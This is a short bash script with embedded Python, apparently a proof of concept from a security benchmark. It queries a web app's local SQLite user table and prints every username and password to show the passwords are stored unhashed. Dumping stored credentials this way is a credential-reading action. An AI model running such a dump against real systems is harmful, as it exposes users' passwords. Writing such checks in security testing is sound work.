#!/bin/bash

# POC: Plaintext Password Storage Vulnerability
# This script demonstrates that user passwords are stored in plaintext in the SQLite database
# Using Python to access the database

DB_PATH="/home/daytona/repo/XBEN-093-24/app/instance/database.db"

if [ ! -f "$DB_PATH" ]; then
    echo "[!] Database file not found at $DB_PATH"
    exit 1
fi

echo "[*] Plaintext Password Storage Vulnerability POC"
echo "[*] Database: $DB_PATH"
echo ""

# Using Python to query the database
python3 << 'PYTHON_EOF'
import sqlite3
import os

db_path = "/home/daytona/repo/XBEN-093-24/app/instance/database.db"

if not os.path.exists(db_path):
    print("[!] Database not found")
    exit(1)

try:
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Query user table
    cursor.execute("SELECT id, username, password FROM user")
    users = cursor.fetchall()
    
    print("[*] User credentials from database:")
    print("[*] " + "-" * 60)
    
    if users:
        for user_id, username, password in users:
            print(f"[+] ID: {user_id}, Username: {username}, Password: {password}")
            
            # Verify it's plaintext (not a hash)
            if len(password) < 20 and not password.startswith('$2'):
                print(f"    [✓] Password is PLAINTEXT (no hashing detected)")
            print()
    else:
        print("[!] No users found in database")
        exit(1)
    
    conn.close()
    
    print("[*] " + "-" * 60)
    print("[✓] VULNERABILITY CONFIRMED:")
    print("    - All passwords are stored in plaintext")
    print("    - No hashing or encryption applied")
    print("    - Database compromise = immediate credential exposure")
    print("    - Violates CWE-256 and NIST SP 800-63B standards")
    
except Exception as e:
    print(f"[!] Error: {e}")
    exit(1)
PYTHON_EOF

exit_code=$?
if [ $exit_code -eq 0 ]; then
    echo ""
    echo "[✓] POC Execution Successful"
else
    echo "[!] POC Execution Failed with exit code $exit_code"
fi

exit $exit_code